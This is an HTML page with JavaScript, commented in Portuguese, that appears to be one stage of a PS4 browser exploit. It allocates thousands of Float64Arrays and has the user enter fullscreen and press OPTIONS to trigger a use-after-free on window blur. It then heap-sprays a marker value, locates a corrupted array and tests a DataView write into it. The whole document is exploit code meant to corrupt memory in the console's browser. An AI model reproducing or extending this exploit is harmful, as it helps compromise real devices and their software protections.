<!DOCTYPE html>
<html>
<body>
    <h1>PS4 UAF - Debugger Core [Sanity Stage 2]</h1>
    <button onclick="run()">EXECUTAR TESTE 2</button>
    <div id="c"></div>

    <script>
        // Funções de conversão fiéis à V2.1
        function h2f(hex) {
            let clean = hex.replace(/0x/g, '');
            let hi = parseInt(clean.slice(0, 8), 16);
            let lo = parseInt(clean.slice(8, 16), 16);
            let b = new ArrayBuffer(8), u = new Uint32Array(b);
            u[0] = lo; u[1] = hi;
            return (new Float64Array(b))[0];
        }

        function f2h(f) {
            let b = new ArrayBuffer(8); (new Float64Array(b))[0] = f;
            let u = new Uint32Array(b);
            return "0x" + u[1].toString(16).padStart(8, '0') + u[0].toString(16).padStart(8, '0');
        }

        const P_A = h2f("0x4141414141414141");

        function log(msg) {
            document.getElementById('c').innerHTML += msg + "<br>";
        }

        function run() {
            log("[INIT] Criando 5000 Float64Arrays...");
            let ctrls = [];
            for(let i = 0; i < 5000; i++) {
                let a = new Float64Array(8); a[0] = i; ctrls.push(a);
            }

            log("[WAIT] Entre em Fullscreen e aperte OPTIONS.");
            document.documentElement.webkitRequestFullscreen();

            window.onblur = function() {
                log("[TRIG] Blur detectado. Iniciando Spray...");
                let spray = [];
                for(let i = 0; i < 8000; i++) {
                    let s = new Float64Array(8); s.fill(P_A); spray.push(s);
                }

                let corr = null;
                for(let i = 0; i < ctrls.length; i++) {
                    if (ctrls[i][0] === P_A) {
                        corr = ctrls[i];
                        log(`[UAF] PASS - Index: ${i}`);
                        break;
                    }
                }

                if (corr) {
                    // TESTE 2: DATAVIEW (LÓGICA ORIGINAL DO BYPASS.HTML)
                    try {
                        const dv = new DataView(corr.buffer); 
                        const before = f2h(corr[0]);
                        
                        // Escrita Little-Endian de 32 bits (0x13371337)
                        dv.setUint32(0, 0x13371337, true); 
                        
                        const after = f2h(corr[0]);
                        
                        if (before !== after) {
                            log(`[TEST2] PASS - DataView Write: ${before} -> ${after}`);
                        } else {
                            log(`[TEST2] FAIL - Escrita não persistiu em corr[0].`);
                        }
                    } catch(e) { 
                        log(`[TEST2] ERR - ${e.message}`); 
                    }
                } else {
                    log("[UAF] FAIL - Corrupção não atingida.");
                }
            };
        }
    </script>
</body>
</html>
